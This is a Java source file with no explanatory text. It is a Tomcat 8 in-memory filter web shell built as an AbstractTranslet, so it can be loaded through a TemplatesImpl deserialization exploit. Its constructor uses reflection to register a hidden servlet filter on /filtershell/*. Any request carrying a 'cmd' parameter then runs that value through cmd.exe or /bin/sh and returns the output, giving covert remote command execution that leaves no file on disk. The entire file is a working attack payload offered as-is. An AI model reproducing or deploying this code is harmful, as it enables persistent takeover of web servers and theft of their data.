package test;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

public class TemplatesImplTomcat8FilterShell extends AbstractTranslet implements Filter{
    public TemplatesImplTomcat8FilterShell() throws Exception {
        
    	String name = "filtershell";

    	WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    	StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
    	Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    	Configs.setAccessible(true);
    	Map filterConfigs = (Map) Configs.get(standardContext);
    	if (filterConfigs.get(name) == null) {
    	    FilterDef filterDef = new FilterDef();
    	    filterDef.setFilter(this);
    	    filterDef.setFilterName(name);
    	    filterDef.setFilterClass(this.getClass().getName());
    	    
    	    standardContext.addFilterDef(filterDef);

    	    FilterMap filterMap = new FilterMap();
    	    filterMap.addURLPattern("/filtershell/*");
    	    filterMap.setFilterName(name);
    	    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    	    
    	    standardContext.addFilterMapBefore(filterMap);
    	    
    	    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    	    constructor.setAccessible(true);
    	    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

    	    filterConfigs.put(name,filterConfig);
    	    
    	}
    	
    	
    }
    
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        if (req.getParameter("cmd") != null){
            String cmd = request.getParameter("cmd");
            boolean isWin = java.lang.System.getProperty("os.name").toLowerCase().contains("win");
            String[] cmds = isWin ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
				String output = s.hasNext() ? s.next() : "";
            resp.getWriter().write(output);
            resp.getWriter().flush();
        }
        chain.doFilter(request,response);
        
    }

    @Override
    public void destroy() {
    }
}


